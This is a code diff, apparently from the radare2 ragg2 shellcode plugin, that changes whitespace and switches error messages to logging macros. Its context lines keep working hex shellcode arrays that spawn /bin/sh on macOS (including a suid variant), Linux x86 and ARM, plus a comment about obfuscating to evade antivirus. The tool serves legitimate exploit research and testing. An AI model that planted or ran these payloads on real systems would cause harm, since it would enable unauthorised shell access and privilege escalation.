@@ -15,25 +15,25 @@ BINSH: (24 bytes) (x86-32/64):
 // XXX: must obfuscate to avoid antivirus
 // OSX
 static ut8 x86_osx_suid_binsh[] =
-        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
+	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
 	/* suid */ "\x31\xff\x4c\x89\xc0\x0f\x05"
 	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
-        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
+	"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
 	// CMD
 	"\x2f\x62\x69\x6e\x2f\x73\x68";
 static ut8 x86_osx_binsh[] =
-        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
+	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
 	// SUIDSH "\x31\xff\x4c\x89\xc0\x0f\x05"
 	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
-        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
+	"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
 	// CMD
 	"\x2f\x62\x69\x6e\x2f\x73\x68";
 
 // linux
 static ut8 x86_linux_binsh[] =
-        "\x31\xc0\x50\x68"
-        "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" // /bin/sh here
-        "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+	"\x31\xc0\x50\x68"
+	"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" // /bin/sh here
+	"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 
 #if 0
 static ut8 x86_64_linux_binsh[] =
@@ -55,14 +55,14 @@ static ut8 thumb_linux_binsh[] =
 	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"
 	"\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";
 
-static RBuffer *build (REgg *egg) {
+static RBuffer *build(REgg *egg) {
 	RBuffer *buf = r_buf_new ();
 	const ut8 *sc = NULL;
 	int cd = 0;
 	char *shell = r_egg_option_get (egg, "cmd");
 	char *suid = r_egg_option_get (egg, "suid");
 	// TODO: last char must not be \x00 .. or what? :D
-	if (suid && *suid=='f') { // false
+	if (suid && *suid == 'f') { // false
 		free (suid);
 		suid = NULL;
 	}
@@ -85,7 +85,7 @@ static RBuffer *build (REgg *egg) {
 		break;
 	case R_EGG_OS_LINUX:
 		if (suid) {
-			eprintf ("no suid for this platform\n");
+			R_LOG_WARN ("no suid for this platform");
 		}
 		suid = 0;
 		switch (egg->arch) {
@@ -100,7 +100,7 @@ static RBuffer *build (REgg *egg) {
 					int len = strlen (shell);
 					if (len > sizeof (st64) - 1) {
 						*shell = 0;
-						eprintf ("Unsupported CMD length\n");
+						R_LOG_ERROR ("Unsupported CMD length");
 						break;
 					}
 					st64 b = 0;
@@ -119,7 +119,7 @@ static RBuffer *build (REgg *egg) {
 				}
 				break;
 			default:
-				eprintf ("Unsupported arch %d bits\n", egg->bits);
+				R_LOG_ERROR ("Unsupported arch %d bits", egg->bits);
 			}
 			break;
 		case R_SYS_ARCH_ARM:
@@ -131,13 +131,13 @@ static RBuffer *build (REgg *egg) {
 				sc = arm_linux_binsh;
 				break;
 			default:
-				eprintf ("Unsupported arch %d bits\n", egg->bits);
+				R_LOG_ERROR ("Unsupported arch %d bits", egg->bits);
 			}
 			break;
 		}
 		break;
 	default:
-		eprintf ("Unsupported os %x\n", egg->os);
+		R_LOG_ERROR ("Unsupported os %x", egg->os);
 		break;
 	}
 
@@ -147,7 +147,7 @@ static RBuffer *build (REgg *egg) {
 			if (cd) {
 				r_buf_write_at (buf, cd, (const ut8 *)shell, strlen (shell) + 1);
 			} else {
-				eprintf ("Cannot set shell\n");
+				R_LOG_ERROR ("Cannot set shell");
 			}
 		}
 	}
